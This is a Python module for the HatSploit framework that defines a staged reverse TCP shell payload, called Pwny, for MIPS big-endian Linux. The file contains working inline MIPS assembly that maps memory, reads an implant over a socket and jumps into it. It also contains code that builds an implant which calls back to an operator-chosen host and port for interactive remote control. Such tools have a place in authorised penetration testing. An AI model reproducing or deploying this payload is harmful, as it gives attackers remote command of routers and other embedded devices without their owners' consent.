
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import io

from pwny import Pwny
from pwny.session import PwnySession

from elftools.elf.elffile import ELFFile

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux mipsbe Pwny Reverse TCP",
            'Payload': "linux/mipsbe/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive reverse Pwny shell for Linux "
                "with MIPS big-endian architecture."
            ),
            'Arch': ARCH_MIPSBE,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    def stage(self):
        implant = self.implant()
        length = len(implant)
        entry = ELFFile(io.BytesIO(implant)).header['e_entry']

        return self.__asm__(
            f"""
            start:
                move $a0, $zero
                li   $a1, {hex(length)}
                li   $a2, 7
                li   $a3, 0x802

                sw   $zero, 16($sp)
                sw   $zero, 20($sp)
                li   $v0, 4090
                syscall

                move $a2, $a1
                move $a1, $v0
                move $a0, $s2
                li   $s3, 0x100
                li   $v0, 4175
                syscall

                and  $sp, $sp, -8
                li   $t4, 0x70000070
                sw   $t4, 44($sp)

                li   $t5, 2
                sw   $t5, 0($sp)
                addi $t6, $sp, 44
                sw   $t6, 4($sp)
                sw   $s2, 8($sp)
                sw   $zero, 12($sp)
                sw   $zero, 16($sp)
                li   $t7, 7
                sw   $t7, 20($sp)
                sw   $a1, 24($sp)
                li   $t8, 8
                sw   $t8, 28($sp)
                li   $t9, 0x1000
                sw   $t9, 32($sp)
                sw   $zero, 36($sp)
                sw   $zero, 40($sp)

                li   $s0, {hex(entry)}
                add  $s0, $s0, $a1
                jr   $s0
            """
        )

    def implant(self):
        return Pwny(
            target='mips-linux-muslsf',
        ).to_binary('bin')

    def run(self):
        return Pwny(
            target='mips-linux-muslsf',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
